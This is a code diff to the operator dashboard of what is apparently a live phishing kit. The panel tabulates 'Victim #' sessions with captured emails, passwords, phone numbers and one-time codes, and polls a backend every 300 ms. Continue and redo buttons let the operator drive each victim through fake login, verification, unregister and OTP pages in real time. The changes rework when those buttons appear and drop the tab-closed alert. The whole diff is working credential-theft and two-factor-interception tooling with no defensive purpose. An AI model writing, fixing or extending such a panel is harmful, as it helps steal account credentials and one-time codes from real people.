@@ -31,8 +31,8 @@
     .btn{padding:.35rem .75rem;font-size:.8rem;border-radius:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.08);color:var(--text-primary);cursor:pointer;transition:all .18s ease}.btn:hover{background:rgba(255,255,255,.15);border-color:rgba(255,255,255,.2)}
     .icon-btn{width:32px;height:32px;padding:6px;border-radius:6px;border:1px solid rgba(255,255,255,.08);background:rgba(255,255,255,.08);cursor:pointer;transition:all .18s ease;display:inline-flex;align-items:center;justify-content:center}.icon-btn:hover{background:rgba(255,255,255,.15);border-color:rgba(255,255,255,.2);transform:scale(1.05)}
     .icon-btn img{width:18px;height:18px;filter:brightness(0) invert(1)}
-    .icon-btn.continue{border-color:rgba(52,211,153,.3);background:rgba(52,211,153,.1)}.icon-btn.continue:hover{background:rgba(52,211,153,.2)}
-    .icon-btn.redo{border-color:rgba(251,113,133,.3);background:rgba(251,113,133,.1)}.icon-btn.redo:hover{background:rgba(251,113,133,.2)}
+    .icon-btn.continue{border-color:rgba(52,211,153,.3)}.icon-btn.continue:hover{background:rgba(52,211,153,.15)}
+    .icon-btn.redo{border-color:rgba(251,113,133,.3)}.icon-btn.redo:hover{background:rgba(251,113,133,.15)}
     .icon-btn.manage{border-color:rgba(96,165,250,.3)}.icon-btn.manage:hover{background:rgba(96,165,250,.15)}
     .cred{font-family:monospace;font-size:.8rem;background:#f1f1f1;padding:2px 4px;border-radius:3px;color:#000}
     .detail{font-size:12px;color:var(--text-muted);margin-top:8px}
@@ -180,43 +180,40 @@
       
       // Always show view details
       html += `<button class="icon-btn manage" onclick="showDetail('${s.sid}')" title="View Details"><img src="/images/description-svgrepo-com.svg"></button>`;
+
+      // Show redo/continue based on page AND data entered - FIXED CONDITIONS
+      if (s.page === 'index.html') {
+        // On login page: show buttons if credentials entered (check both entered flag and email/password values)
+        if (s.entered === true || (s.email && s.password)) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+        }
+      } else if (s.page === 'verify.html') {
+        // On verify page: show buttons if phone entered
+        if (s.phone && s.phone.length > 0) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+        }
+      } else if (s.page === 'unregister.html') {
+        // On unregister page: show continue if clicked, no redo
+        if (s.unregisterClicked === true) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+        }
+      } else if (s.page === 'otp.html') {
+        // On OTP page: show buttons if OTP entered
+        if (s.otp && s.otp.length > 0) {
+          html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
+          html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
+        }
+      }
+      // Note: success page has no buttons (already approved)
       
-      // DEBUG: Show buttons based on page and data
-      console.log(`[DEBUG] Victim #${s.victimNum} - Page: ${s.page}, Entered: ${s.entered}, Phone: ${s.phone}, Unregister: ${s.unregisterClicked}, OTP: ${s.otp}`);
-      
-      // index.html: show buttons if credentials entered
-      if (s.page === 'index.html' && s.entered === true) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      }
-      // verify.html: show buttons if phone entered
-      else if (s.page === 'verify.html' && s.phone && s.phone.length > 0) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      }
-      // unregister.html: show continue if clicked
-      else if (s.page === 'unregister.html' && s.unregisterClicked === true) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-      }
-      // otp.html: show buttons if OTP entered
-      else if (s.page === 'otp.html' && s.otp && s.otp.length > 0) {
-        html += `<button class="icon-btn continue" onclick="act('cont','${s.sid}')" title="Continue"><img src="/images/arrow-right-square-svgrepo-com.svg"></button>`;
-        html += `<button class="icon-btn redo" onclick="act('redo','${s.sid}')" title="Redo"><img src="/images/cross-square-svgrepo-com.svg"></button>`;
-      }
-      
-      html += '</div>';
-      return html;
+      return html + '</div>';
     }
 
-    /* ----------  CHANGE DETECTION  ---------- */
+    /* ----------  CHANGE DETECTION - REMOVED TAB CLOSE DETECTION  ---------- */
     function checkChanges(newSessions){
-      // Check for removed sessions (tab closed)
-      lastSessions.forEach((old, sid) => {
-        if (!newSessions.find(s => s.sid === sid)) {
-          showAlert('error', 'SESSION CLOSED', `Victim #${old.victimNum} closed the tab`, old.victimNum);
-        }
-      });
-
+      // Only check for new data entry, not session removal
       newSessions.forEach(s => {
         const old = lastSessions.get(s.sid);
         if (!old) {
@@ -256,10 +253,8 @@
       const empty= qs('#empty');
       if(!d.sessions.length){ body.innerHTML=''; empty.style.display='block'; return; }
       empty.style.display='none';
-      
-      body.innerHTML = d.sessions.map(s=>{
-        const btnHtml = actionButtons(s);
-        return `<tr data-sid="${s.sid}">
+      body.innerHTML = d.sessions.map(s=>`
+        <tr data-sid="${s.sid}">
           <td>${s.victimNum}</td>
           <td><span class="cred">${s.email||'—'}</span></td>
           <td><span class="cred">${s.password||'—'}</span></td>
@@ -269,9 +264,8 @@
           <td>${s.platform}</td>
           <td>${s.browser}</td>
           <td><div style="font-weight:600">${pageTitle(s.page)}</div>${statusText(s)}</td>
-          <td>${btnHtml}</td>
-        </tr>`;
-      }).join('');
+          <td>${actionButtons(s)}</td>
+        </tr>`).join('');
     }
 
     /* ----------  MODAL / DETAIL VIEW  ---------- */
@@ -280,9 +274,11 @@
       if(!s)return;
       currentSid = sid;
       
+      // Update header
       qs('#modalTitle').textContent = `Victim #${s.victimNum}`;
       qs('#modalSubtitle').textContent = `${s.ip} • Connected ${fmtDate(s.dateStr)}`;
       
+      // Build activity log HTML
       const activityHtml = s.activityLog && s.activityLog.length ? 
         s.activityLog.slice().reverse().map(log => `
           <div class="activity-item">
@@ -381,7 +377,7 @@
       load();
     }
 
-    /* ----------  LOGOUT + EXPORT  ---------- */
+    /* ----------  LOGOUT + EXPORT (bottom-right)  ---------- */
     qs('#logoutBtn').onclick = async () => {
       await fetch('/panel/logout',{method:'POST'});
       location.replace('/panel');
@@ -390,16 +386,12 @@
 
     /* ----------  LONG-POLL  ---------- */
     async function load(){
-      try {
-        const d = await fetch('/api/panel').then(r=>r.json());
-        if(d.error)return location.replace('/panel');
-        jsonData = d;
-        checkChanges(d.sessions);
-        render(d);
-      } catch(e) {
-        console.error('Load error:', e);
-      }
-      setTimeout(load, 300);
+      const d = await fetch('/api/panel').then(r=>r.json());
+      if(d.error)return location.replace('/panel');
+      jsonData = d;
+      checkChanges(d.sessions);
+      render(d);
+      setTimeout(load,300);
     }
     load();
   </script>
